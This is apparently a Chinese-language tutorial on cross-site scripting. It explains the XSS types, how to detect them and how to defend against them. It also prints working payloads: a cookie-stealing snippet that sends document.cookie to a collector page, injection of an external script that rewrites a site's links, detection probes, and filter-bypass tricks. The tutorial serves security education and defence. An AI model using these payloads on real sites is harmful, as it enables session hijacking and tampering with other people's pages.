# 跨站脚本攻击

跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨，导致执行用户提交的恶意js脚本，对网站自身造成危害。

## XSS 是如何发生的呢
假如有下面一个textbox
```html
<input type="text" name="address1" value="value1from">
```
value1from是来自用户的输入，如果用户不是输入value1from,而是输入 "/><script>alert(document.cookie)</script><!- 那么就会变成
```html
<input type="text" name="address1" value=""/><script>alert(document.cookie)</script><!- ">
```
嵌入的JavaScript代码将会被执行    
或者用户输入的是  "onfocus="alert(document.cookie)      那么就会变成 
```html
<input type="text" name="address1" value="" onfocus="alert(document.cookie)">
```
 事件被触发的时候嵌入的JavaScript代码将会被执行。攻击的威力，取决于用户输入了什么样的脚本



## Xss分类
xss大致分为：反射型、存储型、DOM型（这三种为主流）    
反射型xss：只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫”非持久型xss”。（之前项目有遇到过这种，用户在输入时写一个死循环弹出框而导致程序无法正常运行）    
存储型xss：会把用户输入的数据”存储”在服务器端，也叫”持久性xss”，常见留言板等可以提交展示用户输入内容的功能点。     
DOM型xss：从是否存储可划分成反射型，可通过修改页面的DOM节点形成的xss漏洞。     

注意：无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；      
而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码， 因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。


## 检测XSS
1.手工检测：在输入时最特殊字符如< > " ' ()等做转义             
2.工具检测，burpsuit等         

## Xss危害
　　xss漏洞是发生在客户端，目的是让浏览器执行一段用户提交的恶意js代码，从而达到某种目的。从表面上看，xss漏洞的危害止步于客户端，且主要就是用来执行js获取用户信息（比如浏览器版本等等）。然而由于xss漏洞可能发生的地方很多，因此被利用的情况也不统一，以下列举了xss漏洞能够造成的一些危害（xss漏洞危害包含但不仅限于以下几种）。

cookie劫持（窃取cookie）       
钓鱼，利用xss构造出一个登录框，骗取用户账户密码。     
Xss蠕虫（利用xss漏洞进行传播）     
修改网页代码    
利用网站重定向     
获取用户信息（如浏览器信息，IP地址等）     
网站挂马     

## 利用xss窃取cookie
利用xss进行cookie获取劫持是最常用的一种姿势，因为其能获取到管理员权限，危害较大，且利用简单。

### cookie介绍
cookie分为内存cookie和硬盘cookie，内存cookie储存在浏览器内存中，关闭浏览器则消失。cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。              
cookie格式：Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]         
cookie各个参数详细内容：                

Set-cookie:http响应头，向客户端发送cookie。         
Name=value:每个cookie必须包含的内容。           
Expires=date:EXpires确定了cookie的有效终止日期，可选。如果缺省，则cookie不保存在硬盘中，只保存在浏览器内存中。                  
Domain=domain-name:确定了哪些inernet域中的web服务器可读取浏览器储存的cookie，缺省为该web服务器域名。           
Path=path:定义了web服务器哪些路径下的页面可获取服务器发送的cookie。             
Secure:在cookie中标记该变量，表明只有为https通信协议时，浏览器才向服务器提交cookie。                            
Httponly:禁止javascript读取,如果cookie中的一个参数带有httponly，则这个参数将不能被javascript获取；httponly可以防止xss会话劫持攻击。                     
### 利用xss窃取cookie方法
本地写一个xss_cookie.php页面，用于接收cookie。            

在存在xss漏洞的地方，插入以下代码，便可以将cookie发送到xss_cookie.php，并且将cookie参数传递进去，写入文件中。                    

常用获取cookie的js代码(可自行扩展):   
```html
<img src="http://localhost/cspt/XSS_cookie.php?cookie='+document.cookie"></img>
<script>new Image().src="http://localhost/cspt/XSS/xss_cookie.php?cookie="+document.cookie;</script>
``` 
提交之后，本地cookie.txt文件中就会写入cookie值。                

## XSS蠕虫
主要出现在社交软件，依靠社交软件的传播性扩大范围。           
利用xss篡改网页         
前提：网站必须存在存储型xss漏洞，并且会将结果返回到页面上。             
这样我们就可以插入一段js代码，作用在于获取网站源码中的标签，然后修改其中的属性值，达到修改网页的效果。            
实例：修改网站所有连接地址            
本地编写一个test.js脚本，内容如下：           

将以下语句插入存在存储型xss漏洞的网站                 

<script type='text/javascript' src='http://localhost/cspt/XSS/test.js'></script>                    
可以发现存在该漏洞的网页上所有的链接都变成了www.google.com。                       

注：javascript加载外部的代码文件可以是任意扩展名（无扩展名也可以）               

## 利用xss获取用户信息
　　xss获取用户信息，运用最多的还是获取cookie信息，但除此之外，还可以获取用户浏览器版本、外网IP地址、浏览器安装的插件类型等等。以下列举了利用xss获取的客户端用户信息（包含但不仅限于以下几种）。          

alert(navigator.userAgent);读取userAgent内容          
alert(document.cookie);读取用户cookie内容                    
利用java环境，调用java Applet的接口获取客户端本地IP               
注：利用Xss漏洞能做的事有很多，前面已经列举了一些，这里便不对每一个都展开讲解，如需了解更多的xss漏洞内容，最好的方式还是看书。                       

## Xss漏洞探测
前面介绍了一些xss漏洞的基础内容，那么如何去检测一个网站（某个点）是否存在xss漏洞呢？

### xss探针
我们可以在测试xss的位置写入以下代码，查看页面源码，观察哪些代码被过滤或者转义。
                   
1'';!--"<XSS>=&{()}                      
xss探针可检测出网站有没有对xss漏洞做最基础的防御。                  
                     
基础xss语句               
除了xss探针以外，我们也可以输入最简单的测试语句：                    
<script>alert(/xss/)</script>            
如果插入的语句被原封不动的呈现在了浏览器中，那么说明了2个问题：   

代码没有被过滤，说明存在xss
代码没有被执行，因为没有闭合类似textarea标签，可以查看下源码。
如果发现某些参数被过滤了，那么尝试使用其他方式（详细介绍在绕过一节会讲）。

#### xss检测常用语句
列举一些常用的xss漏洞检测代码：
```sql
<script>alert(/xss/);</script>
<script>alert(/xss/)//
<script>alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>//用分号，也可以分号+空格（回车一起使用）
<img src=1 onmouseover=alert(1)>
<a herf=1 onload=alert(1)>nmask</a>
<script>window.a==1?1:prompt(a=1)</script>
<script>a=prompt;a(1)</script>
<img src=0 onerror=confirm('1')>
``` 

## Xss防御
　　如何利用xss漏洞实施攻击并不是身为安全工程师的重点，xss防御才是我们努力要去做的。以下列举几种常见的xss防御方式，个人认为也是非常有效的方式。

可在cookie中设置httponly（浏览器禁止页面的js访问带有httponly属性的cookie）                  
xss filter（检查输入，设置白名单方式）               
输出检查（编码，转义，常用编码：html编码，js编码，16进制等)              
针对不同位置的输出，使用不同的处理方式               
处理富文本                   
header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略）               

设置httponly            
　　httponly无法完全的防御xss漏洞，它只是规定了不能使用js去获取cookie的内容，因此它只能防御利用xss进行cookie劫持的问题。Httponly是在set-cookie时标记的，可对单独某个参数标记也可对全部参数标记。由于设置httponly的方法比较简单，使用也很灵活，并且对防御cookie劫持非常有用，因此已经渐渐成为一种默认的标准。               

xss filter              
　　Xss filter往往是一个文本文件，里面包含了允许被用户输入提交的字符（也有些是包含不允许用户提交的字符）。它检测的点在于用户输入的时候，xss filter分为白名单与黑名单，推荐使用白名单，但即使使用白名单还是无法完全杜绝xss问题，并且使用不当可能会带来很高的误报率。                     

编码转义                  
　　编码方式有很多，比如html编码、url编码、16进制编码、javascript编码等。          
在处理用户输入时，除了用xss filter的方式过滤一些敏感字符外，还需要配合编码，将一些敏感字符通过编码的方式改变原来的样子，从而不能被浏览器当成js代码执行。                 

处理富文本         
　　有些网页编辑器允许用户提交一些自定义的html代码，称之为”富文本”。想要在富文本处防御xss漏洞，最简单有效的方式就是控制用户能使用的标签，限制为只能使用a、div等安全的标签。                  

处理所有输出类型的xss漏洞                          
　　xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义。       

HTML标签中输出                 
即用户输入的内容直接在标签中显示:
```html
<div>$input</div>
```
防御方式，将用户输入进行html编码。

HTML属性中输出
即用户输入的内容出现在标签的某个属性中：
```html
<div name="$input"></div>
```
防御方式，将用户输入进行html编码。

Script标签中输出
即用户输入的内容出现在script标签里面：
```html
<script>
var a="$input";  // $input=";alert(/xss/);//"; 则会产生xss漏洞
</script>
```
防御方式，将用户输入进行javascript编码。

在事件中输出
即在事件标签中输出用户输出的内容，比如onclick标签等。          
防御方式，将用户输入进行javascript编码。       

在CSS中输出
即用户输入的内容出现在了css的style等标签中。    
防御方式，进行十六进制编码。  

在地址中输出                       
这个跟在html属性中输出类似，即在a标签的href属性中输出。               
防御方式，将用户输入进行url编码。          

总结：
总得来说防御xss的方式只是三种：httponly、过滤字符、转义字符。然而使用何种编码转义，什么地方需要做转义才是真正防御xss漏洞的难点及重点，如果能搞明白并解决这个问题，那么xss漏洞将会无处可寻。


## Xss绕过技巧
有xss防御便会有xss绕过防御姿势，这是攻与防不断博弈的表现与成果。作为一名安全工程师，了解如何绕过xss防御可以更好地解决xss防御问题。（这里探讨的绕过xss防御不包含绕过waf的部分）                

绕过xss filter
绕过xss filter的前提在于，xss filter使用了黑名单，并且没有过滤完全。
前提一：如果过滤了”《script》”字符串,但没有过滤”<”、”>”字符，则可以使用javascript:[code]伪协议的形式。

```html
<img src="javascript:alert('test');">
```
前提二：过滤了《script》，且只过滤一次。
```html
<scr<script>ipt>
```
前提三：没有正确处理空格、回车等字符
```html
<img src="javas
Cript:
Alert(/xss/)" width=100>
 ```
关于绕过xss filter的方式还有很多，这里不一一展开了，只是列举下常见的方法：

转换大小写
大小写混写
双引号改单引号
引号改为/
用全角字符
使用javascript伪协议
使用回车、空格等特殊字符
在css的style中使用/**/注释符
使用字符编码
利用事件触发xss

## 真实案例
之前遇到过一个path-base的XSS，通过串改请求地址添加脚本获取cookie信息
eg:
https://www.baidu.cim/%27%3bfunc(document.cookie)%3b%27           

当然目前很多浏览器都对这一个做了处理，比如Chrome会加上/erroe/根据网页配置页面将挑战到404，而IE的策略可能是停止加载。当然也可以通过自己配置服务端针对这些做一些自定义的处理，而不是浏览器的默认处理      
https://blog.innerht.ml/the-misunderstood-x-xss-protection/     
http://www.oschina.net/question/12_72706       
http://wangye.org/blog/archives/596/     
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection     
以上是一些资料收集    
